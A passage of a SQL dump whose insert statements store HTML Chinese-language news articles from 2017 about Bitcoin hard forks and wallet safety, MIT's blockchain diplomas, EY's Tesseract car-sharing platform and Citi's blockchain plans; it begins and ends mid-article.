style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">顺利分离即成功</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	最后一种情况，也是要求最低的一种，只要顺利产生一条支持 2MB 区块的区块链就算是硬分叉成功。这种成功意味着，&nbsp;<span style=\"font-family:&quot;\">当算力支持小于 75%时，支持大区块的矿工们则要以牺牲共识为代价，来执意激活一条 2MB 区块链。</span>（就像 BCC 一样）\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	大区块的主要推动者比特大陆，作为在比特币商业化过程中逐渐形成的矿业巨头，他并非没有这个能力。上文已经提到比特大陆和 BTC.TOP 的手中掌握着 51%的算力，同时比特大陆还掌握着 ASCI 矿机包括芯片散热装置、电源和系统设备、矿机输入电源隔离转换电路等数十项专利，几乎垄断了整个比特币挖矿行业。\r\n</p>\r\n<p class=\"picbox\" style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;text-align:center;\">\r\n	<img src=\"https://wx2.sinaimg.cn/large/006V5KdJgy1fkt4ps18laj30m80jnabd.jpg\" />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	所以基于以上三种情况，无论硬分叉成功与否，11 月之后我们能看到 BTC、BCC、S2X 三条区块链同在的情况将是大概率事件。只是目前尚存悬念的是，到时候哪条链将作为比特币原链存在，哪那条链又将被作为竞争币。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	而说到竞争币，在 2X 硬分叉之前，比特币还要面临一次分裂。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<h1 style=\"color:#333333;font-weight:400;font-family:Arial, &quot;font-size:26px;background-color:#FFFFFF;\">\r\n	分裂新思路：比特币黄金（BTG）\r\n</h1>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	以上讲到的，无论是 BCC 还是 S2X 都是由扩容问题所引发的，而最近才走进人们视野，并将在 Segwit2X 之前被激活的硬分叉——Bitcoin Gold（比特币黄金，BTG），则“开辟”了一条新的比特币分裂思路。&nbsp;<span style=\"font-family:&quot;\">它的目标在于通过改变工作量证明算法来使挖矿回归 CPU 和 GPU，从而解决日益突出的，比特币挖矿“中心化”的问题。</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	比特大陆的垄断地位已经不言而喻。但除此之外，据 coin.dance 的数据显示，目前拥有算力最多的前五大矿池分别是蚁池、BTC.TOP、微比特、鱼池以及 BTC.COM，他们的算力总和超过 60%，而这五家矿池全部来自中国。BTG 贡献者&nbsp;Regojo 曾感慨，“65%的哈希算力来自一个不支持比特币的国家”。\r\n</p>\r\n<p class=\"picbox\" style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;text-align:center;\">\r\n	<img src=\"https://wx4.sinaimg.cn/large/006V5KdJgy1fkt4qcwbrqj30m80dx79z.jpg\" />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	现在的比特币，已经完全背离了中本聪最初的设想“ONE CPU ONE VOTE”（一个 CPU 一票），而是随着半导体工业的发展，经历了 CPU, GPU, FPGA, ASIC 四代技术的更替之后，在 ASIC 矿机时代，逐渐演变成了“ONE MINER VOTE ALL”（一个矿工决定一切）。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	在这种情况之下，无论是矿工还是挖矿硬件制造商都无法在市场中进行公平的竞争。于是 BTG 的开发者们决定尝试对抗这种局面。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	而所谓的比特币黄金，就是要建立一个不受 ASIC 矿机影响的比特币版本。\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">改变工作量证明算法</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	BTG 选择的工作量证明是竞争币 Zcash 所使用的“Equihash 算法”。不同于目前比特币和 BCC 所使用的 SHA256 算法，Equihash 是依赖内存（RAM）来生成证明的&nbsp;，这使得它可以用来对抗特定用途集成电路（ASIC 矿机）对比特币矿业的垄断，从而使挖矿的权利回归 CPU 和 GPU，让算力重回去中心化的状态。\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">添加重放保护，不作正牌比特币</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	为了安全起见，该项目在硬分叉中添加了重放保护措施，以避免造成因操作失误或缺乏专业知识而导致的资金损失。同时，它将采用新的困难调整算法，防止区块链停滞不前。从该项目公布之初，他们就明确表示 Bitcoin Gold 并不期望成为真正的比特币，而是希望作为比特币的一种测试用例，来证明自己的价值。\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">11 月初激活硬分叉</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	他们计划在 10 月 25 日锁定区块链，并于 11 月 1 日开始在该链之后添加新的 BTG 区块，同时他们保持了比特币 2100 万的总额限制。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	但现在的问题是，距离公布的区块链锁定时间还有不到两周，BTG 的底层代码尚未完成，新的难度调整方案和重放保护代码也都没有确定，这不禁让人怀疑它的可靠性。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	面对这种复杂的局面，用户又该做些什么？\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<h1 style=\"color:#333333;font-weight:400;font-family:Arial, &quot;font-size:26px;background-color:#FFFFFF;\">\r\n	用户应该做些什么？\r\n</h1>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">硬分叉之前（10 月 25 日之前）</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	首先，每位比特币持有者现在需要了解的是，数字货币的硬分叉是有风险的，尤其是像 SegWit2x&nbsp;这样有争议的硬分叉。如果你不能承担风险，最好在分裂结束之前不要继续持有比特币。如果你坚定的继续持有，那么在 25 号以及 11 月 18 号之前，每位用户必须做好准备，妥善保存比特币。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<span style=\"font-family:&quot;\">1、保存在交易平台</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	如果你选择在第三方交易平台（比如：coinbase、Xapo）上保存比特币，那么你需要了解该平台对分裂币 BTG 和 S2X 的态度是什么，他们是否会在分裂结束之后支持相应货币的提币和交易，或者是否会提供相应的保护机制。如果该平台没有发布官方声明，最好联系他们的工作人员了解清楚，以确保自己的资产安全。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<span style=\"font-family:&quot;\">2、自己保存私钥</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	如果你希望将比特币的控制权握在自己的手中，那么你应该创建一个比特币钱包，将比特币从第三方托管服务中提取出来，存到钱包里并自己保存私钥。选择使用什么钱包你可以自己决定。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<span style=\"font-family:&quot;\">①<span style=\"color:#EB7350;\"><a href=\"http://www.bitcoin86.com/teach/1695.html\" target=\"_blank\">纸钱包</a></span></span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	如果你希望将 BTC、BTG 和 S2X 作为长期投资，而不在意他们在短期内的交易状况。你可以将现有的比特被保存到纸钱包中。所谓纸钱包，是指将比特币的私钥和地址以二维码的形式打印在一张纸上来进行保存的方法。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<span style=\"font-family:&quot;\">②<a href=\"https://bitcoin.org/zh_CN/choose-your-wallet\" target=\"_blank\">普通电子钱包</a></span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	一般来说，如果你需要一个可以存储并直接轻松访问自己私钥的钱包，bitcoin.org 上所列出的移动钱包和桌面钱包都是很好的选择。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<span style=\"font-family:&quot;\">③<a href=\"http://www.8btc.com/bitcoin-core-intro\" target=\"_blank\">全节点钱包</a></span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	对于具备专业知识和能力的高端比特币用户而言，bitcoin core 全节点钱包也是一个不错的选择。bitcoin core 全节点钱包是目前最完整、安全系数最高的钱包，同时也是最早的比特币客户端。但它的区块链数据文件体积较大，启动慢，每次生成新的收款地址需要备份钱包文件，否则新地址的私钥在丢失后无法恢复。另外全节点钱包在 SegWit2x&nbsp;硬分叉的时候会在短时间内为你提供额外的保护。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<span style=\"font-family:&quot;\">④<a href=\"https://bitcoin.org/en/alert/2017-10-09-segwit2x-safety\" target=\"_blank\">硬件钱包</a></span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	最后，还有一个选择是买一个比特币硬件钱包，同样在 bitcoin.org 上可以自主选择。硬件钱包可以保证你私钥的安全，但是硬件钱包或许不会让用户直接访问 BTG，并且也并不是所有的硬件钱包都为 S2X 提供了相应的保障。\r\n</p>\r\n<p class=\"picbox\" style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;text-align:center;\">\r\n	<img src=\"https://wx1.sinaimg.cn/large/006V5KdJgy1fkt4v2foy2j30m80eg7cg.jpg\" alt=\"亚马逊上的硬件钱包\" /><span class=\"picinfo\" style=\"color:#808080;line-height:20px;font-family:&quot;\">亚马逊上的硬件钱包</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">在比特币黄金（BTG）分裂之后，S2X 分裂之前</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	比特币黄金添加了重放保护，并且公开表示无意成为真正的比特币，所以当你发送比特币交易请求的时候，并不会影响到你的 BTG。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	但是，10 月 25 日只是比特币黄金锁定区块链的日子，而真正完成分裂则需要至少一个星期的时间，官方给出的时间是在 11 月 1 日正式分裂，但实际的时间可能会稍晚一些。因此在 BTG 分裂之后 2X 硬分叉之前，不要急着访问你的 BTG。\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">2X 硬分叉之后</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	2X 硬分叉之后的情况可能比较混乱。因为不同的交易平台对 SegWit2x 的态度不同，一些人为它是比特币的升级版本，因此他们会将 2X 链称为 BTC，然而另一些则会将现在的比特币称为 BTC，而将 2X 链成为 BT2 或者 B2X。所以不同平台上，比特币价格的差别可能会很大，而这些所谓的比特币也很有可能不是同一条区块链上的。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	另外，一些轻钱包上显示的可能会是算力更多的那一条区块链，所以你没有办法区分你钱包里显示的余额是 BTC 还是 S2X。因此，当你花费比特币的时候你可能花费了等额的 S2X，&nbsp;<span style=\"font-family:&quot;\">所以为了安全起见，在硬分叉之后，最好不要立即交易比特币，也不要用轻钱包进行任何比特币支付。</span>\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	目前 Electrum、GreenAddress 和 Bitcoin Core 钱包已经宣布，无论算力如何分配，他们只会将现在的比特币显示为 BTC。但其他平台和钱包的态度大概还要等分裂结束之后才能确定。\r\n</p>\r\n<ul class=\" list-paddingleft-2\" style=\"color:#333333;font-size:14px;background-color:#FFFFFF;font-family:Arial, &quot;\">\r\n	<li style=\"font-family:&quot;\">\r\n		<p style=\"color:#666666;font-size:12px;\">\r\n			<span style=\"color:#333333;\">分离分裂币</span>\r\n		</p>\r\n	</li>\r\n</ul>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	最后，如果这三条链都能够存活下来，并且你始终控制着你的私钥，那么在 11 月中旬之后，你将可以访问 BTC、S2X 以及 BTG，并执行分离分裂币的操作。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	因为 BTG 有重放保护，所以你只需要在钱包中插入你的私钥即可。目前尚不清楚有哪些钱包会支持 BTG。一般来说，你需要在访问 BTG 之前将 BTC（和 S2X）转移到新的地址或者全新的钱包。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	而对于 S2X，你能否获得相应的补偿主要取决于你的比特币所存储的交易平台或者钱包的态度。到 11 月中旬之后，BTC 和 S2X 可能会出现分别专用的钱包，到时候只需要升级或者下载全新的钱包即可。但这些都要视分裂之后的情况而定了。\r\n</p>\r\n<p style=\"color:#333333;font-family:Arial, &quot;background-color:#FFFFFF;\">\r\n	所以简单来说，&nbsp;<span style=\"font-family:&quot;\">每位坚持持有比特币的用户在 10 月 25 日之前最好自己保存私钥，并坚持到 2X 硬分叉之后；为了安全起见在比特币区块链稳定运行之前，最好避免交易 BTC；当一切尘埃落定之后，关注交易平台和钱包的官方公告，及时执行分离币操作。</span>\r\n</p>', '', '1', 'bbb', '0', '1', '1', '2', '1512398554', '1512057600', '0');
INSERT INTO `movesay_article` VALUES ('82', '美国麻省理工大学MIT使用比特币区块链发行学位证书', '', '<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">世界顶尖大学麻省理工（MIT）已宣布了一项试点计划，其将利用比特币区块链为111位毕业生签发毕业证书。该项目是由麻省理工学院注册处办公室及马萨诸塞州软件公司Learning Machine合作实施的。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"color:#555555;font-weight:500;font-family:&quot;font-size:24px;background-color:#FFFFFF;\">\r\n	MIT将使用Blockcerts钱包，通过比特币区块链签发毕业证书\r\n</h2>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">根据麻省理工的网站显示，Blockcerts钱包可发行一种“可验证、防篡改”的认证证书。麻省理工学院指出，为了确保学位证书的安全性，该试点项目利用了当前最为安全的比特币区块链。此外，麻省理工学院还将该机构的身份认证者Touchstone与该计划进行结合。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<img class=\"aligncenter size-full wp-image-143298\" alt=\"mit\" src=\"http://7fvhfe.com1.z0.glb.clouddn.com/wp-content/uploads/2017/10/201710230202088257.jpg\" width=\"750\" height=\"450\" style=\"height:auto;\" />\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">在麻省理工学院（MIT）看来，该计划是“开创性”的，基于区块链的学术认证可实现前所未有的“自主记录”。MIT注册主任及高级助理迪安.玛丽.卡拉汉(Dean Mary Callahan)表示，</span>\r\n</p>\r\n<blockquote style=\"background:#F3F5F9;color:#555555;font-family:&quot;font-size:18px;\">\r\n	<p style=\"color:#666666;font-size:12px;font-family:&quot;\">\r\n		<span style=\"color:#333333;font-size:14px;\">“从一开始，我们的主要动机之一，就是让学生成为自己证书的管理者。这个试点项目使得他们可拥有自己记录的所有权，并能够以安全的方式与他人分享，无论他们选择的是谁。”</span>\r\n	</p>\r\n</blockquote>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">克里斯.佳格斯（Chris Jagers），Learning Machine公司的首席执行官兼联合创始人，其称赞了麻省理工采用区块链技术的创新举措。“麻省理工学院已发布的这种官方记录方式，即使是该机构消失了，即使作为供应商的我们也离开了，这些记录依然能够存在。人们能够拥有并使用他们的官方记录，这是一种根本性的转变。”</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"color:#555555;font-weight:500;font-family:&quot;font-size:24px;background-color:#FFFFFF;\">\r\n	MIT历经多年，精心打造Blockcerts钱包产品\r\n</h2>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">早在2015年时，麻省理工学院媒体实验室的菲利普.施密特（Philipp Schmidt ），就在其团队内部启用了一种“非学术性的数字证书”。在2016年时，Learning Machine公司与施密特的团队达成了合作，共同开发一种称为Blockcerts的开源工具包，任何开发者或学校都可以使用它来发行或验证基于区块链的教育证书。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">佳格斯（Jagers）指出，Blockcerts钱包的目的是克服学生妥善存储及保管私钥的挑战。他表示，“告诉学生们去生成比特币区块链的公私钥对，存在着巨大的障碍，很少有人会知道你在说些什么。”</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">麻省理工指出，这种Blockcerts钱包会生成公私钥对，并将公钥发送给麻省理工，接下来，一笔单向的哈希信息会添加到区块链。最后，麻省理工会通过电子邮件，把包含学生公钥的数字学位证书发送给学生。因为学生手机上的app包含他们独特的私钥，学生就可以证明其学位证书的所有权。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"color:#555555;font-weight:500;font-family:&quot;font-size:24px;background-color:#FFFFFF;\">\r\n	麻省理工认为，该计划对于学生而言拥有诸多好处\r\n</h2>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">麻省理工表示，该应用允许学生能够免费且几乎即时地，将他们的学位证书分享给其所选择的任何对象，其不涉及到任何中介。此外，麻省理工还指出，正是由于区块链，第三方可以很容易地验证证书是否是真实合法的，而无需再去接触注册办公室。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:&quot;font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:&quot;\">对于该项目迄今为止的表现，迪安.玛丽.卡拉汉(Dean Mary Callahan)表示满意，她还透露说，欧盟委员会以及诸多国际大学询问过该项目的事宜。“我们刚刚接触这个问题的表面，这是一个激动人心的时刻，” 卡拉汉说。</span>\r\n</p>', '', '1', 'bbb', '0', '1', '1', '3', '1512398613', '1512144000', '0');
INSERT INTO `movesay_article` VALUES ('83', '区块链进入共享汽车行业，实现共享使用权和所有权', '', '<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; 该技术将促进建立一个真正将消费者放到第一位的汽车服务生态系统。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 据了解，纽约时间30日，安永会计师事务所的会计咨询公司EY宣布，他们正式推出移动平台Tesseract。值得注意的是，该平台是基于区块链技术（Blockchaintechnology）开发的，它能使公司或个人更加安全地共享车辆的所有权。EY的合伙人JohnSimlett表示，EY可能会在下个季度部署Tesseract与另外一个系统合作运行。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 对于Tesseract，Simlett表示，区块链系统可以让目前大量的自有车辆实现共享使用权和所有权，如停放在建筑旁的一排汽车，居民如果想要使用，只需通过手机app访问即可，安全便捷。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; “共享”这一概念在汽车行业已经不是什么新鲜的概念，但使用区块链技术记录车辆所有权、登记车辆使用情况、分摊保险成本等交易尚处于起步阶段。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 区块链技术最初是伴随着数字加密货币---比特币的发展而为越来越多的人所熟知的。区块链技术（Blockchaintechnology），就是一种利用去中心化和去信任方式集体维护一本数据簿的可靠性技术方案。该方案要让参与系统中的任意多个节点，通过一串使用密码学方法相关联产生的数据块（block）每个数据中都包含了一定时间内的系统全部信息交流的数据，并生成数据指纹用于验证其信息的有效性和链接下一个数据库块。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 简言之，区块链技术其实是一类技术解决方案的集合，是一种基于计算机加密技术的无可替代的信用凭证，因为该技术允许用户访问的是计算机网络维护的数据，而不是第三方。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 关于此技术的应用，早在五月份，丰田汽车公司就表示，丰田研究院将与麻省理工学院以及一些技术合作伙伴的研究人员合作开发基于区块链技术的应用程序。其中，技术合作伙伴包括柏林的BigchainDB、达拉斯和多伦多的OakenInnovations以及以色列创业公司Commuterz。此外，丰田公司还表示，他们同时也在与合作伙伴一起开发基于区块链技术的保险产品。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 本月初，一批大型食品和零售公司表示，他们将与IBM合作，以研究区块链技术如何应用于食品供应链中。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 最近微软也表示，他们正在使用英特尔技术开发一个将协议更广泛地引入业务应用的区块链框架——CoCo框架，来解决当前区块链协议技术的问题。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 区块链技术的未来将会伴随着共享经济的发展而到来，对此，全球汽车运输业负责人RandyMiller也说道：“汽车和运输业的未来将是综合的、按需的、个性化的和自主的。Tesseract是一个突破性的创新平台，为整个汽车生态系统的每一位参与者创造利益。我们希望Tesseract可以打破大家之前建立的壁垒，提供一种将汽车行业转化为服务行业的方式，并促进建立一个真正将消费者放到第一位的汽车服务生态系统。”</span>\r\n</p>', '', '1', 'ccc', '0', '1', '1', '1', '1512398673', '1512230400', '0');
INSERT INTO `movesay_article` VALUES ('84', '花旗银行可能采用区块链 利用区块链实现货币交换', '', '<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">花旗投资银行集团的一位高层表示，政府支持的加密货币是采用区块链技术的关键。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 在一次独家采访中，亚太地区最近被任命为核心的现金管理,摩根麦肯尼,把CitiConnect区块链项目定位在一个更大的背景范围内——一个分布式分类技术的最终的成功取决于法定货币的发行出现在一个区块链。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 根据麦肯尼的说法，每一种支付方式都有与之匹配的环境，如果要充分释放该项目的潜力和区块链环境，加密货币无疑是最合适的支付方式。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 尽管目前对这项技术的研究成本已经达到了187亿美元的上限，但她解释说，如果可以用区块链的法定货币购买大量的加密资产，那么就要进一步赋予原子互换的权利。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 有个数据显示，有90个国家已经做好了接受“数字货币”的“准备”，但花旗本身迄今为止还是处于非加密货币的领域。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 